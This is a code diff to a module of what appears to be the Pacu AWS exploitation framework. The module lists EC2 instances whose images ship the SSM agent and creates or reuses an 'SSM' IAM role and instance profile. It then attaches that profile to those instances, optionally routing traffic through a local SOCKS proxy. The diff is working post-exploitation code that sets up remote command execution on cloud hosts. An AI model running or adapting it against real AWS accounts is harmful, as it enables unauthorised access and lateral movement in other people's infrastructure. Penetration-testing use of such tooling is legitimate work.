@@ -52,7 +52,8 @@ def main(args, pacu_main):
         print('Pre-req module not run successfully. Exiting...')
         return
     instances = session.EC2['Instances']
-    session.EC2['ActiveImages'] = []
+
+    instance_profile = dict()
 
     # Images
     try:
@@ -81,6 +82,7 @@ def main(args, pacu_main):
     ]
 
     # Begin enumeration of vulnerable images
+    vuln_images = []
     for region in regions:
         image_ids = []
         print('Starting region {}...\n'.format(region))
@@ -105,10 +107,6 @@ def main(args, pacu_main):
                 ImageIds=list(set(image_ids))
             )['Images']
 
-            session.EC2['ActiveImages'] += images
-
-            vuln_images = []
-
             # Iterate images and determine if they are possibly one of the operating systems with SSM agent installed by default
             count = 0
             for image in images:
@@ -122,7 +120,6 @@ def main(args, pacu_main):
             print('  {} vulnerable images found.\n'.format(count))
     print('Total vulnerable images found: {}\n'.format(len(vuln_images)))
     
-    # Begin Systems Manager role finder/creator
     client = boto3.client(
         'iam',
         aws_access_key_id=session.access_key_id,
@@ -131,6 +128,7 @@ def main(args, pacu_main):
         config=botocore.config.Config(proxies={'https': 'socks5://127.0.0.1:8001', 'http': 'socks5://127.0.0.1:8001'}) if not proxy_settings.target_agent == [] else None
     )
 
+    # Begin Systems Manager role finder/creator
     ssm_policy = client.get_policy(
         PolicyArn='arn:aws:iam::aws:policy/service-role/AmazonEC2RoleforSSM'
     )['Policy']
@@ -184,8 +182,9 @@ def main(args, pacu_main):
             if not ssm_role_name == '':
                 break
     if ssm_role_name == '':
-        print('Did not find valid EC2 SystemsManager service role. Trying to create one now...\n')
+        print('Did not find valid EC2 SystemsManager service role (which means there is no instance profile either). Trying to create one now...\n')
         try:
+            # Create the SSM role
             create_response = client.create_role(
                 RoleName='SSM',
                 AssumeRolePolicyDocument='{"Version": "2012-10-17", "Statement": [{"Sid": "", "Effect": "Allow", "Principal": {"Service": "ec2.amazonaws.com"}, "Action": "sts:AssumeRole"}]}'
@@ -193,17 +192,73 @@ def main(args, pacu_main):
 
             ssm_role_name = create_response['RoleName']
 
+            # Attach the SSM policy to the role just created
             attach_response = client.attach_role_policy(
                 RoleName=ssm_role_name,
                 PolicyArn='arn:aws:iam::aws:policy/service-role/AmazonEC2RoleforSSM'
             )
-            print('Successfully created the required role: {}'.format(create_response['Arn']))
+            print('  Successfully created the required role: {}\n'.format(create_response['Arn']))
         except Exception as error:
-            print('Unable to create the required role: {}'.format(str(error)))
+            print('  Unable to create the required role: {}\n'.format(str(error)))
             return
     else:
-        print('Found valid SystemsManager service role: {}\n'.format(ssm_role_name))
+        print('Found valid SystemsManager service role: {}. Checking if it is associated with an instance profile...'.format(ssm_role_name))
 
+        # Find instance profile belonging to that role
+        response = client.list_instance_profiles_for_role(
+            RoleName=ssm_role_name,
+            MaxItems=1
+        )
+
+        if len(response['InstanceProfiles']) > 0:
+            instance_profile = response['InstanceProfiles'][0]
+            print('Found valid instance profile: {}.'.format(instance_profile['InstanceProfileName']))
+        # Else, leave instance_profile == dict()
+
+    # If no instance profile yet, create one with the role we have
+    if instance_profile == {}:
+        # There is no instance profile yet
+        try:
+            # Create a new instance profile
+            instance_profile = client.create_instance_profile(
+                InstanceProfileName='SSM'
+            )['InstanceProfile']
+
+            # Attach our role to the new instance profile
+            client.add_role_to_instance_profile(
+                InstanceProfileName=instance_profile['InstanceProfileName'],
+                RoleName=ssm_role_name
+            )
+        except Exception as error:
+            print('  Unable to create an instance profile: {}\n'.format(str(error)))
+            return
+
+    client = boto3.client(
+        'ec2',
+        aws_access_key_id=session.access_key_id,
+        aws_secret_access_key=session.secret_access_key,
+        aws_session_token=session.session_token,
+        config=botocore.config.Config(proxies={'https': 'socks5://127.0.0.1:8001', 'http': 'socks5://127.0.0.1:8001'}) if not proxy_settings.target_agent == [] else None
+    )
+
+    # Start attaching the instance profile to the vulnerable instances
+    for region in regions:
+        for instance in instances:
+            if instance['Region'] == region:
+                if instance['ImageId'] in vuln_images:
+                    if 'IamInstanceProfile' in instance:
+                        # If we need to replace the current instance profile to do this
+                        # For now, skipping this as it could be harmful to an environment
+                        pass
+                    else:
+                        # There is no instance profile attached yet, do it now
+                        response = client.associate_iam_instance_profile(
+                            IamInstanceProfile={
+                                'Name': instance_profile['InstanceProfileName'],
+                                'Arn': instance_profile['Arn']
+                            },
+                            InstanceId=instance['InstanceId']
+                        )
 
     print('{} completed.'.format(os.path.basename(__file__)))
     return
